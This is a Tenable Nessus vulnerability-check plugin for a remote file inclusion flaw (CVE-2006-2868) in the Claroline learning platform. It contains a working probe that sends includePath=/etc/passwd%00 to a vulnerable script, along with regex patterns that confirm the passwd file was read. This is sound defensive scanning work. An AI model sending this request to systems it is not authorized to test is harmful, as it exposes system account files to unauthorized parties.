#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(21641);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2006-2868");
  script_bugtraq_id(18265);
  script_xref(name:"OSVDB", value:"25324");
  script_xref(name:"OSVDB", value:"25327");

  script_name(english:"Claroline Multiple Script includePath Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using Claroline");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
remote file inclusion attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Claroline, an open-source, web-based,
collaborative learning environment written in PHP. 

The version of Claroline installed on the remote host fails to
sanitize input to the 'includePath' parameter before using it to
include PHP code in the 'claroline/auth/extauth/drivers/mambo.inc.php'
and 'claroline/auth/extauth/drivers/postnuke.inc.php' scripts. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit these flaws to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/1877" );
 script_set_attribute(attribute:"see_also", value:"http://www.claroline.net/wiki/index.php/Changelog_1.7.x" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Claroline 1.7.6 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("claroline_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/claroline"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  r = http_send_recv3(method: "GET", port: port,
    item:string(
      dir, "/claroline/auth/extauth/drivers/mambo.inc.php?",
      "includePath=", file
    ) );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0/lib/extauth\.lib\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br />");

    if (isnull(contents)) report = desc;
    else
      report = string(
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
